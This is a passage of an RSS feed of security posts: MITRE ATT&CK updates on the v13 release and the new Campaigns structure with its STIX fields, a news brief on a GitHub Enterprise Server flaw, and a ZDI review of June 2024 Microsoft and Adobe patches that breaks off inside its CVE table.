us to continue offering free and accessible services while also advancing our capabilities and scope.</p><p>We are <strong>immensely grateful</strong> for the support we have received thus far from initial benefactors SOC Prime, Tidal Cyber, and Zimperium. We remain committed to serving the community with transparency; whether you’re a contributor, a fellow defender, or just getting started, we thank you for being part of ATT&amp;CK’s journey.</p><h3><strong>Looking Forward</strong></h3><p>Mark your calendars for the v15 release on April 23! You’ll see some novel content interspersed with familiar elements, as well as more practical defensive measures.</p><p>As always, we value the opportunity to collaborate with you in ensuring that ATT&amp;CK remains a living framework, where each contribution, conversation, or new implementation fuels its evolution. We look forward to continuing this adventure with you.</p><p>Connect with us on <a href="mailto:attack@mitre.org">email</a>, <a href="https://twitter.com/MITREattack">Twitter</a>, <a href="https://www.linkedin.com/showcase/mitre-att&amp;ck/">LinkedIn</a>, or <a href="https://join.slack.com/t/mitreattack/shared_invite/zt-ny1a3yon-XkT_OS1IF~ZYrESq8Xtqjg">Slack</a>.</p><p>©2024 The MITRE Corporation. ALL RIGHTS RESERVED. Approved for public release. Distribution unlimited 24–00779–2.</p><img alt="" height="1" src="https://medium.com/_/stat?event=post.clientViewed&amp;referrerSource=full_rss&amp;postId=8dfc46d1ad1b" width="1" /><hr /><p><a href="https://medium.com/mitre-attack/attack-2024-roadmap-8dfc46d1ad1b">ATT&amp;CK 2024 Roadmap</a> was originally published in <a href="https://medium.com/mitre-attack">MITRE ATT&amp;CK®</a> on Medium, where people are continuing the conversation by highlighting and responding to this story.</p>
]]></content:encoded>
<pubDate>2024-05-21T13:58:40.300Z</pubDate>
</item>
<item>
<title>ATT&amp;CK v13 Enters the Room</title>
<link>https://medium.com/mitre-attack/attack-v13-enters-the-room-5cef174c32ff?source=rss----6da19bd08fba---4</link>
<guid>https://medium.com/mitre-attack/attack-v13-enters-the-room-5cef174c32ff?source=rss----6da19bd08fba---4</guid>
<content:encoded><![CDATA[
<figure><img alt="" src="https://cdn-images-1.medium.com/max/1024/1*PkApzI8NMYPKdGGq2ZA1Vw.png" /></figure><h3>ATT&amp;CK v13 Enters the Room: Pseudocode, Swifter Search, and Mobile Data Sources</h3><p>It’s not like a regular Tuesday, it’s a lucky Tuesday — ATT&amp;CK v13 has arrived. As we outlined in our <a href="https://medium.com/mitre-attack/2023-attack-roadmap-452fab541673">Roadmap</a>, we’re working toward enhanced tools for lower-resourced defenders, improving ATT&amp;CK’s website usability, enhancing ICS and Mobile parity with Enterprise, and evolving overall content and structure this year. ATT&amp;CK v13 is bringing some analytics pseudocode, Mobile-specific data sources, key website updates, ICS Asset refactoring, and more Cloud and Linux coverage. For the rest of our regular updates/additions across Techniques, Software, Groups and Campaigns take a look at our <a href="https://attack.mitre.org/resources/updates/updates-april-2023/index.html">release notes</a>, our (new) <a href="https://attack.mitre.org/docs/changelogs/v12.1-v13.0/changelog-detailed.html">detailed changelog</a>, or our (new) <a href="https://attack.mitre.org/docs/changelogs/v12.1-v13.0/changelog.json">changelog.json</a>.</p><h3>Defensive Easy Button: Pseudocode for Detection</h3><p>This release features a new defensive ‘easy button’, with the addition of <a href="https://car.mitre.org/">CAR</a> pseudocode to a number of our data components. These pseudocode analytics add more context on what you should find and collect, by describing at a high level the steps involved in detecting certain types of behaviors. You can use these analytics as a blueprint for your custom detections, leaving you with more time to spend on the defensive activities of your choice.</p><figure><img alt="" src="https://cdn-images-1.medium.com/max/838/1*qbIfAT_TjlqGitKsI1z65Q.png" /></figure><p>Moving forward we’ll be revamping Mitigations and improving defenses tactic-by-tactic, by incorporating analytics from CAR and dynamic research into the data components falling under a given tactic. If you’d like to join our efforts, <a href="mailto:attack@mitre.org">let us know</a> or join us in the <a href="https://mitreattack.slack.com/archives/C036RA0B7EX"><strong>#defensive_attack</strong></a> channel.</p><h3>ATT&amp;CK’s Infrastructure: ATT&amp;CK Search 2.0 and changelog.json</h3><p>Two of our most frequently requested items are now here: faster search and machine-readable changelogs!</p><p>We’ve <strong>all</strong> experienced the patience-building opportunity associated with using the ATT&amp;CK website search, so we’re thrilled to finally introduce a new and improved search! While it won’t be breaking the sound barrier anytime soon, it will save you some serious time when you’re trying to figure out which techniques cover Import Access Table. Your initial search with the enhanced version will be in the 5-second range, with following queries resolving near instantaneously. We’ll continue to adjust this important feature and appreciate all of you who stayed with us through the search bar trials. Let us know if you spot any new corner cases!</p><p>Another significant addition to this release is a <a href="https://attack.mitre.org/docs/changelogs/v12.1-v13.0/changelog.json">machine-readable changelog</a>. You’ll now be able to access and parse through the changelog, quickly identifying and integrating the updates. For more details check out the <a href="https://github.com/mitre-attack/mitreattack-python/blob/master/mitreattack/diffStix/README.md">changelog.json format details in our GitHub</a>. Our <a href="https://attack.mitre.org/resources/updates/updates-april-2023/">release notes format</a> has also been improved, now documenting New, Major Version Changes, Minor Version Changes, and Patches for each of Techniques, Mitigations, Data Sources, Data Components, Software, Groups, and Campaigns. If you’re wondering what “Patches” are, it’s what we’re calling changes so minor (e.g., typos, URL fixes, grammar) no version update was necessary.</p><p>We don’t expect quite as much celebration for our ATT&amp;CK Navigator updates, but new updates coming with ATT&amp;CK v13 enable you to further customize your layer colors, scoring, image orientation and preset image sizing — for more details, check out the Navigator <a href="https://mitre-attack.github.io/attack-navigator/">release notes</a> (click on the ? in the top right of Navigator).</p><figure><img alt="" src="https://cdn-images-1.medium.com/max/138/1*1N1Gp76i9hL5TaCaMl7_Kw.png" /></figure><h3>Mobile: Data Sources are Live</h3><p>On the Mobile front, you’ll now be able to access <a href="http://attack.mitre.org/datasources/">Mobile-specific Data Sources</a>! Mobile has joined the filter list along with Enterprise and ICS, enabling you to toggle between the data sources for your chosen domain(s). In addition to the new Mobile-specific sources, the cross-domain mappings with Enterprise are now more accessible. The Mobile-specific and cross-mapped sources are also listed on the individual Data Source pages.</p><figure><img alt="" src="https://cdn-images-1.medium.com/max/480/1*3qu362KQAsQCKvDZuYZUIw.png" /></figure><p>Over the next few months, we’ll continue to add to our Mobile data sources, as well as architecting <a href="https://medium.com/mitre-attack/attack-goes-to-v11-599a9112a025?source=collection_home---4------0-----------------------">structured </a><a href="https://attack.mitre.org/resources/updates/">detections</a>. If you’d like to contribute to this space or start a conversation, <a href="mailto:attack@mitre.org">email</a> or <a href="https://join.slack.com/t/mitreattack/shared_invite/zt-ny1a3yon-XkT_OS1IF~ZYrESq8Xtqjg">slack</a> us (don’t call).</p><h3>ICS: Asset Refactoring for Enhanced Coverage</h3><p>The ICS matrix features new techniques, a freshly cross-mapped campaign, and updates to Assets (the functional components of the systems in the ICS domain). Our Assets refactoring effort seeks to align how different industries describe assets, in order to better map device functionality to core dependencies and associate the Assets to the relevant techniques. Through this effort we’ve also been working to address gaps from underreported industries. We’ll continue to collaborate with the ICS community to better build out and describe assets and create these mappings. Our goal is to include Assets in the metadata box on technique pages to help inform defenders about a device’s susceptibility to techniques.</p><h3>Campaigns: Criminals, APTs and Cross-Mappings</h3><p>Our Campaigns game is going strong, with v13 showcasing a blend of recent cyber intrusions and those previously captured in a Group page. A couple of our more contemporary entries include APT41’s compromise of U.S. state government networks (<a href="http://attack.mitre.org/campaigns/C0017/">C0017</a>), and an AvosLocker ransomware-as-a-service operation (<a href="http://attack.mitre.org/campaigns/C0018/">C0018</a>). Some of the older activity previously featured in Groups, include APT29’s <a href="http://attack.mitre.org/campaigns/C0023/">Operation Ghost</a> and the <a href="http://attack.mitre.org/campaigns/C0024/">SolarWinds</a> compromise. The star of this release, and one we’re particularly excited about, is the cross-domain Campaign entry, the <a href="http://attack.mitre.org/campaigns/C0025/">2016 Ukraine operation</a> by Sandworm Team. Over the next several months, we’ll continue to focus on criminal group operations and expanding on the hybrid Campaigns that traverse domains.</p><h3>Cloud: Now with More Exec and LatMo Coverage</h3><p>We assessed known gaps in the Execution and Lateral Movement tactics of the Cloud matrix and built out additions to address some of the disparities. These changes feature contributions from an ongoing partnership with the Cloud community to better represent behaviors in and against Cloud technologies, as well as reflecting how organizations are using Cloud in their operations. In the coming months, we’ll continue to expand coverage in these not-so-easy-to-capture cloud-related tactics, as well as evaluating where to develop more Exfiltration coverage.</p><p>Our end goal this year is to ensure that everyone can more effectively utilize ATT&amp;CK for Cloud. If you have ideas or contributions to share, please <a href="http://attack@mitre.org/">email us</a> or drift by the #<a href="https://mitreattack.slack.com/archives/C035Z0AL8R0"><strong>cloud_attack</strong></a> channel on the <a href="https://join.slack.com/t/mitreattack/shared_invite/zt-ny1a3yon-XkT_OS1IF~ZYrESq8Xtqjg">ATT&amp;CK slack</a>.</p><h3>Linux: Making the Penguin a Little More Secure</h3><p>Our Linux team has spent the last few months going through contributions, coordinating with contributors, and navigating through open-source reporting for in-the-wild adversary behaviors. This release includes updated and new Linux-only (sub)techniques that will enhance the Linux defender’s toolset. We’ll continue building out Linux coverage in ATT&amp;CK, as well as gaining a better understanding of the adversaries operating in this space. If you’d like to work with us or to join our very exclusive Linux channel <strong>(#</strong><a href="https://mitreattack.slack.com/archives/C035BUEMMHP"><strong>linux_attack</strong></a>), we’d love to have a conversation.</p><h3>Next Up: v14 and ATT&amp;CKcon</h3><p>We know you’re still trying to catch your breath from all the v13 adjustments, but we’re still sprinting for v14! October’s release will feature upgraded coverage across domains, renovated mitigations, new cross-domain mappings, more pseudocodes, and Mobile structured detections.</p><p>We’ll also be releasing more details on ATT&amp;CKCon 4.0 soon (October 24–25), so start getting ready with some light reading/watching of previous <a href="https://attack.mitre.org/resources/attackcon/">ATT&amp;CKcon</a> presentations or couch interviews.</p><p>As always, we look forward to connecting with you on <a href="mailto:attack@mitre.org">email</a>, <a href="https://twitter.com/MITREattack?ref_src=twsrc%5Egoogle%7Ctwcamp%5Eserp%7Ctwgr%5Eauthor">Twitter</a>, or <a href="https://join.slack.com/t/mitreattack/shared_invite/zt-ny1a3yon-XkT_OS1IF~ZYrESq8Xtqjg">Slack</a>.</p><p>©2023 The MITRE Corporation. ALL RIGHTS RESERVED. Approved for public release. Distribution unlimited 22–00745–1</p><img alt="" height="1" src="https://medium.com/_/stat?event=post.clientViewed&amp;referrerSource=full_rss&amp;postId=5cef174c32ff" width="1" /><hr /><p><a href="https://medium.com/mitre-attack/attack-v13-enters-the-room-5cef174c32ff">ATT&amp;CK v13 Enters the Room</a> was originally published in <a href="https://medium.com/mitre-attack">MITRE ATT&amp;CK®</a> on Medium, where people are continuing the conversation by highlighting and responding to this story.</p>
]]></content:encoded>
<pubDate>2023-04-25T14:56:21.249Z</pubDate>
</item>
<item>
<title>Introducing ATT&amp;CK Campaigns</title>
<link>https://medium.com/mitre-attack/introducing-attack-campaigns-6b15baa6cbb4?source=rss----6da19bd08fba---4</link>
<guid>https://medium.com/mitre-attack/introducing-attack-campaigns-6b15baa6cbb4?source=rss----6da19bd08fba---4</guid>
<content:encoded><![CDATA[
<figure><img alt="" src="https://cdn-images-1.medium.com/max/1024/1*_CSbbgPWimTXkEud2wxlIA.png" /></figure><h3><strong>Introducing Campaigns to MITRE ATT&amp;CK</strong></h3><p><strong><em>By: </em></strong><em>Amy Robertson, Jared Ondricek, and Matt Malone</em></p><p>We’ve talked about building Campaigns into ATT&amp;CK in our A<a href="https://medium.com/mitre-attack/attack-2022-roadmap-cd5a1a3387c7">TT&amp;CK 2022 roadmap</a>, at <a href="https://www.youtube.com/watch?v=yP0upd-65Yc&amp;list=PLkTApXQou_8Jo2B27kq62Md4bypcBqBAw&amp;index=13">ATT&amp;CKCon 3.0</a>, and most recently on the <a href="https://www.youtube.com/watch?v=Jd2yLBfg8xE">SANS Threat Analysis Rundown</a> but their release is now nigh! Our initial collection of Campaigns will be available starting with our ATT&amp;CK v12 release on October 25, when you’ll be able to leverage the Campaigns structure for all of your ATT&amp;CK use cases. Prior to the release, we’re taking the opportunity to walk you through our vision for Campaigns, give you a tour of Campaigns elements, and cover our longer-term Campaigns plans.</p><p><strong>The Campaigns Vision</strong></p><p>For our purposes in ATT&amp;CK, we use “Campaigns” to describe a grouping of intrusion activity conducted over a specific period of time with common targets and objectives. A key aspect of Campaigns is that the activity may or may not be linked to a specific threat actor.</p><p>Our vision for Campaigns is to provide users with another way to view the evolution of malicious cyber operations. Threat actor activity in ATT&amp;CK currently encompasses a broad set of behaviors that can inform a holistic picture of the adversary over time. But as adversaries evolve, their TTPs often change, and by introducing some structure with Campaigns, we hope to allow you to glean more actionable intelligence and context to inform your defense prioritization<strong>. </strong>Campaigns will enable you to identify trends, track significant changes in techniques used by various actors, and monitor the introduction of new capabilities (or exploited vulnerabilities). You’ll also be able to identify continued threat actor reliance on certain techniques regardless of the campaign objective and/or targets.</p><p>Campaigns will also allow us to more accurately categorize complex intrusion activity, including those involving multiple threats (such as Ransomware-as-a-Service operations) and parse out overlapping operations that have been given the same name. With the new structure, we’ll also be converting some of the Groups in ATT&amp;CK to Campaigns. This will apply to Groups that meet our definition of a Campaign and only feature one cluster of activity (such as G0101/Frankenstein and G0014/Night Dragon).</p><p>As is our tradition of carefully integrating structural elements in ATT&amp;CK, we’ll be incorporating a limited number of Campaigns into the v12 release. This initial collection of Campaigns will feature former Group entries that are more accurately categorized as Campaigns, a curated number of Campaigns linked to existing Groups, as well as unattributed Campaigns.</p><p><strong>Campaign Elements</strong></p><p>We structured Campaigns to visually align with Groups and Software pages, and the v12 release will feature an addition of a new “Campaigns” button on the main page tool bar for easy access.</p><figure><img alt="" src="https://cdn-images-1.medium.com/max/649/1*rRkWQX7KklJV1lZ0H9pEhQ.png" /><figcaption><em>Figure 1: Example of the new ATT&amp;CK tool bar with the “Campaigns” button.</em></figcaption></figure><p>The Campaigns homepage will include a Campaigns table featuring ID number, Name, and activity descriptions. The list of available Campaigns in the left column highlights the Campaigns added or converted to date. As we previously covered, we created some flexibility in terms of whether or not the activity was given a unique name — a limitation we currently face with Groups — by allowing a Campaign to be simply referenced by our own identifier (e.g., C0014) if it doesn’t already come with a name.</p><figure><img alt="" src="https://cdn-images-1.medium.com/max/958/1*VpfouMBhClv5Zek8VGelyg.png" /><figcaption><em>Figure 2: A draft Campaign table, with unnamed activity referenced as C0014.</em></figcaption></figure><p>Each Campaign entry will feature a description of the intrusion activity, including details like known targeted countries and sectors where available, as well as any information that makes this Campaign particularly noteworthy.</p><figure><img alt="" src="https://cdn-images-1.medium.com/max/1024/1*4gW0dKk2KpkpJTTq2HvYtw.png" /><figcaption><em>Figure 3: A draft Campaign page for all of the Trekkies out there!</em></figcaption></figure><p>Something we’ve been particularly mindful of is how to best capture the period of time related to a Campaign. We opted for the “First Seen” and “Last Seen” fields in the information box, with the corresponding reference citations, so users can see how a Campaign was scoped. For intrusion activity assessed to be ongoing at the time of report publication, we’ll add language to that affect in the Campaign description (e.g., “As of September 2022 security researchers assessed this activity was ongoing”) and update future versions of ATT&amp;CK Campaign entries accordingly.</p><figure><img alt="" src="https://cdn-images-1.medium.com/max/702/1*hFnZT2dOn2qoueCEwvBA9g.png" /><figcaption><em>Figure 4: An example Campaigns information box with time frame fields and citations.</em></figcaption></figure><p>As with Groups and Software, we’ve created a “Techniques Used” table to capture actor procedure examples observed during a Campaign, with a couple of significant differences.</p><p>1. We’ll add as much detail as reporting allows regarding specific commands or steps taken by the actors, to help ATT&amp;CK users identify corresponding detection and mitigation opportunities. We’ve found this concept to be more challenging for Group and Software pages, as those tend to aggregate a variety of reporting examples over time, resulting in more generic procedure example language.</p><p>2. We’ll preface our Campaign procedure examples with the Campaign name or associated ID number, to separate it from techniques already found on a Group page. We realize the utility of this may not be immediately evident while looking at a Campaign page, but this allows for the procedure examples to stand out separately when a Campaign is associated with a Group (and, hopefully, allows for smoother integration in the future if an unattributed Campaign is later attributed to a Group).</p><figure><img alt="" src="https://cdn-images-1.medium.com/max/790/1*Od0xrpCbicBcN1AeD8S18w.png" /><figcaption><em>Figure 5: Separate procedure examples as seen from a Group page, based on a fictional Campaign. The top line is the existing procedure example for T1566.001 for a Group, while the second line is specifically related to the associated Campaign.</em></figcaption></figure><p><strong>What does this mean for Groups and Software?</strong></p><p>We’ve made two key changes to Group and Software pages as they relate to Campaigns. As previously mentioned, techniques and corresponding procedure examples mapped to a Group-attributed Campaign will carry over to the associated Group page. We’ll also continue to map Campaign-specific procedure examples to Software pages.</p><p>We’ve added a Campaigns table to associated Group and Software pages, so ATT&amp;CK users can easily reference Campaign ID numbers, Names (when applicable), and the Campaign description.</p><p>Group and Software pages will otherwise remain visually unchanged, and we’ll continue to update them separately as a collective list of all observed techniques. We want to preserve the functionality of ATT&amp;CK Navigator Layers in that respect, for ATT&amp;CK users who want to focus on all techniques used regardless of time or target.</p><p><strong>Introducing the Campaign STIX Object</strong></p><p>With the addition of Campaigns to ATT&amp;CK, the ATT&amp;CK Data Model (which can be found in our <a href="https://github.com/mitre/cti/blob/master/USAGE.md#the-attck-data-model">Usage document</a>), has expanded to encompass these changes. The diagram below portrays how all the moving pieces work together, with the new additions of the Campaign object type and the Relationships connected to Campaigns. It’s important to note, there are no changes to objects that previously existed in ATT&amp;CK. Software written to read earlier versions of ATT&amp;CK should continue to work, albeit missing data that only appears in Campaigns.</p><figure><img alt="" src="https://cdn-images-1.medium.com/max/1024/1*jVbUes3GwidA_ionbx6hbw.png" /><figcaption>Figure 6: Campaign STIX relationships</figcaption></figure><p>Now that you’ve seen our data model, we’d like to introduce you to the star of the show — the <a href="http://docs.oasis-open.org/cti/stix/v2.0/csprd01/part2-stix-objects/stix-v2.0-csprd01-part2-stix-objects.html#_Toc476230925">STIX Campaign object</a>. As a part of the ATT&amp;CK Data Model, it makes use of the same STIX extensions that can be found there, such as x_mitre_version. However, in addition to those previously documented fields, here is the breakdown of how ATT&amp;CK utilizes each field that is unique to the Campaign object:<br /> <br /> Standard STIX fields:</p><ul><li>type: Follows the STIX specification</li><li>name: The name used to identify the Campaign. If no name is given, then this field will contain an ATT&amp;CK identifier in the form CXXXX</li><li>description: Follows the STIX specification</li><li>aliases: Used to hold associated Campaign names</li><li>first_seen (timestamp): The time frame that this Campaign was first seen. ATT&amp;CK makes use of this field only to the level of granularity of month/year. The day and time part of this timestamp field should be ignored by parsers when displaying ATT&amp;CK Campaign information</li><li>last_seen (timestamp): The time that this Campaign was last seen or reported. ATT&amp;CK makes use of this field only to the level of granularity of month/year. The day and time part of this timestamp field should be ignored by parsers when displaying ATT&amp;CK Campaign information</li><li>objective: Not used by ATT&amp;CK</li></ul><p>Extensions of the STIX Spec:</p><ul><li>x_mitre_first_seen_citation (string): One to many citations for when the Campaign was first reported in the form “(Citation: &lt;citation name&gt;)” where &lt;citation name&gt; can be found as one of the source_name of one of the external_references.</li><li>x_mitre_last_seen_citation (string): One to many citations for when the Campaign was last reported in the form “(Citation: &lt;citation name&gt;)” where &lt;citation name&gt; can be found as one of the source_name of one of the external_references.</li></ul><p>As mentioned above, we have also added <strong>three new STIX Relationships</strong> that connect Campaigns to the rest of the ecosystem; namely that Campaigns can optionally be <strong>attributed to a Group, use Software, or use Techniques</strong>. The STIX Relationship objects themselves have no special modifications from the STIX standard and simply connect Campaigns to those previously existing objects. At a glance this seems straightforward enough, but there are some things to be aware of if you are parsing ATT&amp;CK v12 STIX going forward.</p><p>When gathering data about Groups that have Campaigns attributed to them, it’s a bit more complex to parse out all the Techniques and Software that are used by the Group. For Campaigns associated with a Group, we won’t be creating relationships between techniques and Software in that Campaign and the Group, if you would like to view the inclusive list, you’ll need to combine technique sets and Software usage.</p><p><strong>Combining Technique Sets: </strong>To get a comprehensive Group Technique view, you’ll need to combine the set of Techniques that are directly used by the Group with the set of Techniques used by all of their associated Campaigns.</p><figure><img alt="" src="https://cdn-images-1.medium.com/max/638/1*1k6NxIMlGneRco1xvLe_1w.png" /><figcaption>Figure 7: Example of Group Technique STIX inheritance</figcaption></figure><p><strong>Mapping Software Object Usage:</strong> To holistically map out Software object usage, you’ll identify the Groups, the Group-attributed Campaigns, and the unattributed Campaigns using the Software, and combine them for the full picture.</p><p>For further technical details on how to handle retrieving all Techniques or Software that a Group uses starting with the v12 release and how it differs from the v11 and prior releases, please refer to the <a href="https://github.com/mitre/cti/blob/master/USAGE.md#relationships-microlibrary">Relationships Microlibrary</a> section of the <a href="https://github.com/mitre/cti/blob/master/USAGE.md">GitHub Usage</a> document.</p><p><strong>What to Expect Going Forward</strong></p><p>We’ll continue modifying and building out Campaigns, with the eventual goal of revisiting a major Group pages in ATT&amp;CK and reconstructing earlier Campaigns to reflect how these actors have evolved over time. We’ll also shift focus from one-off or unattributed Campaigns to more complex Campaigns attributed to some of the more populated Group entries, such as the SolarWinds intrusion and <a href="https://attack.mitre.org/groups/G0016/">G0016/APT29</a>.</p><p>Campaigns will also serve a key role in tying together the various ATT&amp;CK matrices — Enterprise (Cloud, Containers, macOS, and Linux), Mobile, and ICS, to further document how adversaries pivot across these domains using a variety of techniques to accomplish their objectives.</p><p>We greatly appreciate the community’s feedback on Campaigns to date, and as we continue to develop Campaigns, we welcome your input. Our Contributions page will be updated in the near future to include more detailed guidance and we look forward to connecting with you via <a href="http://attack@mitre.org">email</a>, <a href="https://join.slack.com/t/mitreattack/shared_invite/zt-ny1a3yon-XkT_OS1IF~ZYrESq8Xtqjg">Slack</a>, or <a href="https://twitter.com/mitreattack">Twitter</a>.</p><p>©2022 The MITRE Corporation. ALL RIGHTS RESERVED. Approved for public release. Distribution unlimited 22–00744–13.</p><img alt="" height="1" src="https://medium.com/_/stat?event=post.clientViewed&amp;referrerSource=full_rss&amp;postId=6b15baa6cbb4" width="1" /><hr /><p><a href="https://medium.com/mitre-attack/introducing-attack-campaigns-6b15baa6cbb4">Introducing ATT&amp;CK Campaigns</a> was originally published in <a href="https://medium.com/mitre-attack">MITRE ATT&amp;CK®</a> on Medium, where people are continuing the conversation by highlighting and responding to this story.</p>
]]></content:encoded>
<pubDate>2023-01-11T20:35:41.083Z</pubDate>
</item>
<item>
<title>GitHub Patches Critical Security Flaw in Enterprise Server Granting Admin Privileges</title>
<link>https://thehackernews.com/2024/08/github-patches-critical-security-flaw.html</link>
<guid>https://thehackernews.com/2024/08/github-patches-critical-security-flaw.html</guid>
<content:encoded><![CDATA[
GitHub has released fixes to address a set of three security flaws impacting its Enterprise Server product, including one critical bug that could be abused to gain site administrator privileges.
The most severe of the shortcomings has been assigned the CVE identifier CVE-2024-6800, and carries a CVSS score of 9.5.
"On GitHub Enterprise Server instances that use SAML single sign-on (SSO)
]]></content:encoded>
<pubDate>Thu, 22 Aug 2024 10:18:00 +0530</pubDate>
</item>
<item>
<title>The June 2024 Security Update Review</title>
<link>https://www.thezdi.com/blog/2024/6/11/the-june-2024-security-update-review</link>
<guid>https://www.thezdi.com/blog/2024/6/11/the-june-2024-security-update-review</guid>
<content:encoded><![CDATA[
<p class="">Somehow, we’ve made it to the sixth patch Tuesday of 2024, and Microsoft and Adobe have released their regularly scheduled updates. Take a break from your regular activities and join us as we review the details of their latest security alerts. If you’d rather watch the full video recap covering the entire release, you can check it out here:</p>





















  
  






  <p class=""><strong>Adobe Patches for June 2024</strong></p><p class="">For June, Adobe released 10 patches addressing 165(!) CVEs in Adobe Cold Fusion, Photoshop, &nbsp;Experience Manager, Audition, Media Encoder, FrameMaker Publishing Server, Adobe Commerce, Substance 3D Stager, Creative Cloud Desktop, and Acrobat Android. The fix for <a href="https://helpx.adobe.com/security/products/experience-manager/apsb24-28.html">Experience Manager</a> is by far the largest with a whopping 143 CVEs addressed. However, all but one of these bugs are simply cross-site scripting (XSS) vulnerabilities. The patch for <a href="https://helpx.adobe.com/security/products/coldfusion/apsb24-41.html">Cold Fusion</a> fixes two bugs, but neither are code execution bugs. That’s the same case for the patch addressing bugs in <a href="https://helpx.adobe.com/security/products/audition/apsb24-32.html">Audition</a>. The fix for <a href="https://helpx.adobe.com/security/products/media-encoder/apsb24-34.html">Media Encoder</a> has a single OOB Read memory leak fixed. The update for <a href="https://helpx.adobe.com/security/products/photoshop/apsb24-27.html">Photoshop</a> also has just one bug – a Critical-rated code execution issue. That’s also the story for the <a href="https://helpx.adobe.com/security/products/substance3d_stager/apsb24-43.html">Substance 3D Stager</a> patch.</p><p class="">The patch for <a href="https://helpx.adobe.com/security/products/framemaker-publishing-server/apsb24-38.html">FrameMaker Publishing Server</a> has only two bugs, but one is a CVSS 10 and the other is a 9.8. If you’re using this product, this should be the first patch you test and deploy. The patch for <a href="https://helpx.adobe.com/security/products/magento/apsb24-40.html">Commerce</a> should also be high on your test-and-deploy list as it corrects 10 bugs, including some Critical-rated code execution vulns. The patch for <a href="https://helpx.adobe.com/security/products/creative-cloud/apsb24-44.html">Creative Cloud Desktop</a> fixes a single code execution bug. Finally, the patch for <a href="https://helpx.adobe.com/security/products/acrobat-android/apsb24-50.html">Acrobat Android</a> corrects two security feature bypasses.</p><p class="">None of the bugs fixed by Adobe this month are listed as publicly known or under active attack at the time of release. Adobe categorizes these updates as a deployment priority rating of 3.</p><p class=""><strong>Microsoft Patches for June 2024</strong></p><p class="">This month, Microsoft released 49 CVEs in Windows and Windows Components; Office and Office Components; Azure; Dynamics Business Central; and Visual Studio. If you include the third-party CVEs being documented this month, the CVE count comes to 58. A total of eight of these bugs came through the ZDI program, and that does include some of the cases reported during the Pwn2Own Vancouver contest in March.</p><p class="">Of the new patches released today, only one is rated Critical, and 48 are rated Important in severity. This release is another small release when compared to the monster that was April. </p><p class="">Only one of the CVEs listed today is listed as publicly known, but that’s actually just a third-party update that’s now being integrated into Microsoft products. Nothing is listed as being under active attack. Let’s take a closer look at some of the more interesting updates for this month, starting with the lone Critical-rated patch for this month:</p><p class="">-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30080" target="_blank"><strong>CVE-2024-30080</strong></a><strong> – Microsoft Message Queuing (MSMQ) Remote Code Execution Vulnerability<br /></strong>This update receives a CVSS rating of 9.8 and would allow remote, unauthenticated attackers to execute arbitrary code with elevated privileges of systems where MSMQ is enabled. That makes this wormable between those servers, but not to systems where MSMQ is disabled. This is similar to the “<a href="https://www.helpnetsecurity.com/2023/04/11/cve-2023-28252/" target="_blank">QueueJumper</a>” vulnerability from last year, but it’s not clear how many affected systems are exposed to the internet. While it is likely a low number, now would be a good time to audit your networks to ensure TCP port 1801 is not reachable. &nbsp;</p><p class="">-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30103" target="_blank"><strong>CVE-2024-30103</strong></a><strong> – Microsoft Outlook Remote Code Execution Vulnerability<br /></strong>This patch corrects a bug that allows attackers to bypass Outlook registry block lists and enable the creation of malicious DLL files. While not explicitly stated, attackers would likely then use the malicious DLL files to perform some form of DLL hijacking for further compromise. The good news here is that the attacker would need valid Exchange credentials to perform this attack. The bad news is that the exploit can occur in the Preview Pane. Considering how often credentials end up being sold in underground forums, I would not ignore this fix. &nbsp;</p><p class="">-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30078" target="_blank"><strong>CVE-2024-30078</strong></a><strong> – Windows Wi-Fi Driver Remote Code Execution Vulnerability<br /></strong>This vulnerability allows an unauthenticated attacker to execute code on an affected system by sending the target a specially crafted network packet. Obviously, the target would need to be in Wi-Fi range of the attacker and using a Wi-Fi adapter, but that’s the only restriction. Microsoft rates this as “exploitation less likely” but considering it hits every supported version of Windows, it will likely draw a lot of attention from attackers and red teams alike. </p><p class="">Here’s the full list of CVEs released by Microsoft for June 2024:</p>





















  
  
























<table border="0" cellpadding="0" cellspacing="0" width="953">
 <col class="xl70" width="151" />
 <col class="xl73" width="263" />
 <col class="xl72" span="4" width="111" />
 <col class="xl72" width="95" />
 <tr height="48">
  <td class="xl65" height="48" width="151"><span> </span>CVE<span> </span></td>
  <td class="xl66" width="263"><span> </span>Title<span> </span></td>
  <td class="xl67" width="111"><span> </span>Severity<span> </span></td>
  <td class="xl67" width="111"><span> </span>CVSS<span> </span></td>
  <td class="xl67" width="111"><span> </span>Public</td>
  <td class="xl67" width="111"><span> </span>Exploited<span> </span></td>
  <td class="xl67" width="95"><span> </span>Type<span> </span></td>
 </tr>
 <tr height="76">
  <td class="xl75" height="76"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30080"><span><span> </span>CVE-2024-30080</span></a></td>
  <td class="xl66" width="263"><span> </span>Microsoft Message Queuing (MSMQ) Remote Code
  Execution Vulnerability<span> </span></td>
  <td class="xl74"><span> </span>Critical<span> </span></td>
  <td class="xl67">9.8</td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67">RCE</td>
 </tr>
 <tr height="76">
  <td class="xl75" height="76"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-35255"><span><span> </span>CVE-2024-35255<span> </span></span></a></td>
  <td class="xl66" width="263"><span> </span>Azure Identity Libraries and Microsoft
  Authentication Library Elevation of Privilege Vulnerability<span> </span></td>
  <td class="xl71"><span> </span>Important<span> </span></td>
  <td class="xl67">5.5</td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67">EoP</td>
 </tr>
 <tr height="48">
  <td class="xl75" height="48"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-35254"><span><span> </span>CVE-2024-35254 †</span></a></td>
  <td class="xl66" width="263"><span> </span>Azure Monitor Agent Elevation of Privilege
  Vulnerability<span> </span></td>
  <td class="xl71"><span> </span>Important<span> </span></td>
  <td class="xl67">7.1</td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67">EoP</td>
 </tr>
 <tr height="76">
